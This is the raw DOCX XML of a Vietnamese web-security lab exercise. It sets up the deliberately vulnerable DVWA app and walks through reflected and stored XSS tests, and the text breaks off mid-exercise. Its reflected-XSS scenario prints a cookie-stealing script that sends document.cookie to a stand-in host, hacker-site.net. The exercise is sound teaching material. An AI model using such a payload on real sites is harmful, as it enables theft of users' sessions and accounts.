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E4DD578">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0DB66C83">
      <w:pPr>
        <w:jc w:val="center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BÀI THỰC HÀNH SỐ 9</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01B66A32">
      <w:pPr>
        <w:jc w:val="center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KIỂM THỬ LỖ HỔNG XSS và CSRF</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7266BC00">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="75E5B82F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>Lik youtube :</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="723FB03D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1: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> HYPERLINK "https://youtu.be/cSmZmLXAq3M" </w:instrText>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="51"/>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>https://youtu.be/cSmZmLXAq3M</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="42F5D8CE">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t xml:space="preserve">2: </w:t>
      </w:r>
      <w:bookmarkStart w:id="0" w:name="_GoBack"/>
      <w:bookmarkEnd w:id="0"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> HYPERLINK "https://youtu.be/GPyY-H8ILug" </w:instrText>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="51"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>https://youtu.be/GPyY-H8ILug</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="10F18106">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6CF80D63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1.4 Cài đặt môi trường luyện tập</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CCF5446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Cài đặt ứng dụng web DVWA để luyện tập</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68F1DDBB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Bước 1: Download mã nguồn tại địa chỉ sau: http://www.dvwa.co.uk/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7367E075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Xem thêm ở đây: https://vietnix.vn/cai-dat-dvwa-tren-linux/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="199F3045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Bước 2: Giải nén file đã download được và đổi tên thành “dvwa”</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73C98056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Bước 3: Sao chép thư mục sau khi đã giải nén vào thư mục webroot của Web Server</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FEB69A3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Bước 4: Tạo một CSDL có tên là “dvwa”</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09476223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Bước 5: sửa nội dung file dvwa/config/config.inc.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F0D64B1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$_DVWA[ &amp;#39;db_server&amp;#39; ] = &amp;#39;127.0.0.1&amp;#39;;//Địa chỉ IP của máy chủ DBMS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AA99610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$_DVWA[ &amp;#39;db_database&amp;#39; ] = &amp;#39;dvwa&amp;#39;; //Tên CSDL</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F8469FB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$_DVWA[ &amp;#39;db_user&amp;#39; ] = &amp;#39;&amp;#39;; //Tài khoản truy cập DBMS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70596E33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$_DVWA[ &amp;#39;db_password&amp;#39; ] = &amp;#39;&amp;#39;; //Mất khẩu truy cập DBMS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="308162E3">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7AB68198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Bước 5: Mở trình duyệt và truy cập vào địa chỉ http://localhost/dvwa/setup.php và nhấp nút</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4177BDA6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Create/Reset database</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7540628D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Bước 6: Sau khi cài đặt thành công, truy cập vào website tại địa chỉ http//localhost/dvwa với tài khoản</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78993420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là “admin” và mật khẩu là “password”</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52C35063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Bước 7: Thiết lập giá trị cho DVWA Security là “Low” để phần bắt đầu luyện tập dễ dàng hơn</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1ABE550F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Xem thêm hướng dẫn cài đặt DVWA tại địa chỉ sau:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D713A33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 xml:space="preserve">- Windows: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> HYPERLINK "https://www.youtube.com/watch?v=ljws7f0Nijs" </w:instrText>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="51"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>https://www.youtube.com/watch?v=ljws7f0Nijs</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C3E62D6">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5A96C780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 xml:space="preserve">- Linux: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> HYPERLINK "https://www.youtube.com/watch?v=5BG6iq_AUvM" </w:instrText>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="51"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>https://www.youtube.com/watch?v=5BG6iq_AUvM</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="349C90D3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05344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1.5 Kiểm thử lỗ hổng CSRF</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="287278AC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Download và tìm hiểu cách sử dụng công cụ kiểm thử CSRFTester tại địac chỉ:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35ACE557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https://www.owasp.org/index.php/Category:OWASP_CSRFTester_Project</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62F25E6A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2 Tấn công XSS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DB7C2FF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2.1 Giới thiệu</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E101A3A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Cross-Site Scripting (XSS, không gọi là tắt là CSS để tránh nhầm lẫn với khái niệm Cascading Style</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E732031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Sheet của HTML) là một trong những kĩ thuật tấn công phổ biến nhất hiện nay, được mệnh danh</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="780F9DF7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là Godfather of Attack, và trong nhiều năm liền được liệt vào danh sách những kỹ thuật tấn công nguy</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D0BBF59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hiểm nhất với ứng dụng web.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D4D634F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Kỹ thuật XSS được thực hiện dựa trên việc chèn các đoạn script nguy hiểm vào trong source code ứng</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="469A5949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dụng web. Nhằm thực thi các đoạn mã độc Javascript để chiếm phiên đăng nhập của người dùng. Để hiểu</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A04A091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rõ hơn, chúng ta xét ví dụ sau:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62EB0CE6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Truy cập vào website DVWA, chọn mục XSS(Reflected)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56E7A90A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Bước 1: Nhập vào ô nhập liệu giá trị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 xml:space="preserve"> Tien Len </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>chúng ta được kết quả như sau:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5ECEF819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5CEEE">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5E3AED1F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Như vậy có thể đoán được chức năng này hiển thị lời chào với tên người nhập vào</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A2D3242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 xml:space="preserve">- Bước 2: Nhập vào ô nhập liệu giá trị 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&lt;b&gt; Tien Len &lt;/b&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>; chúng ta được kết quả:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1500A81E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BBE8B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Tên người đã được in đậm cho thấy thẻ ; đã được xử lý để hiện thị. Đây là cơ sở để nghi ngờ chức</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AF7D0C9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năng này có lỗ hổng XSS để khai thác.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="131B61D7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Bước 3: Nhập chuỗi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 xml:space="preserve"> &lt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>scrip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&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> alert(“Hi”)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&lt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>/script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 xml:space="preserve">&gt; </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>chúng ta sẽ thấy một hộp thoại cảnh báo được bật</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E326244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Lên</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40D5D327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EF2E0">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6FC2929B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Như vậy có thể thấy, mã Javascript nhúng vào giá trị đầu vào đã được thực thi</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D9B69BD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Từ ví dụ này có thể kết luận 2 điều.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E70AA66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 Thứ nhất biến name có thể nhận giá trị đầu vào bất kỳ và truyền lên server xử lý.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C7BAC4A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 Thứ 2, server đã không kiểm soát giá trị đầu vào này trước khi trả về cho trình duyệt. Dẫn đến việc</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CAF9953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đoạn mã javascript đã bị chèn vào trong source code.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08F0ED6D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XSS nói chung được chia làm 3 loại chính là Reflected, Stored và DOM based.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AF9B030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2.2 Kịch bản tấn công</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AB767F4">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>&lt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Nội dung này được lấy từ website http:// http://securitydaily.net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&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CC7E262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2.2.1. Tấn công Reflected XSS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12ABEA25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Có nhiều hướng để khai thác thông qua lỗi Reflected XSS, một trong những cách được biết đến nhiều</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05B5626E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nhất là chiếm phiên làm việc (session) của người dùng, từ đó có thể truy cập được dữ liệu và chiếm được</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="649898B9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quyền của họ trên website. Chi tiết được mô tả theo các bước như sau:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3029FCEC">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2DF8B9A8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1. Người dùng đăng nhập web và giả sử được gán session:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36E32903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Set-Cookie: sessId=5e2c648fa5ef8d653adeede595dcde6f638639e4e59 d4</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="557E7172">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="20259C7A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2. Bằng cách nào đó, hacker gửi được cho người dùng URL sau, trong đó example.com là website</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13D16268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nạn nhân truy cập, hacker-site.net là trang của hacker tạo ra</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C0B7163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http://example.com/name=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&lt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>script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&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>var+i=new+Image;+i.src=”http://hacker-</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F6B3AB7">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>site.net/”%2bdocument.cookie;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&lt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>/script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&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5652082C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3. Nạn nhân truy cập đến URL trên</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05F00BA5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4. Server phản hồi cho nạn nhân, kèm với dữ liệu có trong request(đoạn javascript của hacker)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C0A9B7B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5. Trình duyệt nạn nhân nhận phản hồi và thực thi đoạn javascript</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B094514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6. Đoạn javascript mà hacker tạo ra thực tế như sau:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09FC727C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var i=new Image; i.src=”http://hacker-site.net/”+document.cookie;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="404074DE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Dòng lệnh trên bản chất thực hiện request đến site của hacker với tham số là cookie người dùng:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41072748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GET /sessId=5e2c648fa5ef8d653adeede595dcde6f638639e4e59 d4 HTTP/1.1Host: hacker-</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DD69795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site.net</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DC191BB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7. Từ phía site của mình, hacker sẽ bắt được nội dung request trên và coi như session của người dùng</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B80E4C6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sẽ bị chiếm. Đến lúc này, hacker có thể giả mạo với tư cách nạn nhân và thực hiện mọi quyền trên</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5398182A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website mà nạn nhân có.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2820CAFA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Trong ví dụ ở trên, chúng ta đã thực hiện kiểm thử lỗ hổng Reflected XSS của trang DVWA</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18F8BE94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2.2.2. Tấn công Stored XSS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5241C9FF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Khác với Reflected tấn công trực tiếp vào một số nạn nhân mà hacker nhắm đến, Stored XSS hướng đến</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D74B51A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nhiều nạn  nhân hơn. Lỗi này xảy ra khi ứng dụng web không kiểm tra kỹ các dữ liệu đầu vào trước khi</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73653660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lưu vào cơ sở dữ liệu. Ví dụ như các form góp ý, các comment … trên các trang web.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04917EB6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Với kỹ thuật Stored XSS , hacker không khai thác trực tiếp mà phải thực hiện tối thiểu qua 2 bước.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="530CA556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Đầu tiên hacker sẽ thông qua các điểm đầu vào (form, input, textarea…) không được kiểm tra kỹ để chèn</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51D77D85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vào CSDL các đoạn mã nguy hiểm.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59151509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Kịch bản khai thác được mô tả như hình sau:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="724FE8E0">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3F28E688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Chúng ta thực hiện ví dụ sau để kiểm thử lỗ hổng Stored XSS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BCF5EAB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Truy cập vào website DVWA, chọn mục XSS(Stored)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04D00309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B1: Nhập vào ô nhập liệu tên người là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 xml:space="preserve"> Tien Len</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> và thông điệp Hi. Chúng ta được kết quả như sau:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D8B88CA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1CE2A">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2B22E671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 xml:space="preserve">- B2: Nhập vào ô nhập liệu tên người là An và thông điệp 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&lt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>b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&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Hi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&lt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>/b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&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>. Chúng ta được kết quả như sau:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42EE7227">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="46092F30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Suy luận tương tự như ví dụ về Reflected XSS, chúng ta thấy chức năng này có thể có lỗ hổng Stored</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65CBEE9B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XSS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3678AE9E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 xml:space="preserve">- B3: Nhập vào ô nhập liệu tên người là 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Tien Len</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> và thông điệp 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&lt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>script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&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>alert(“Hi”)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&lt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">/script 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&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
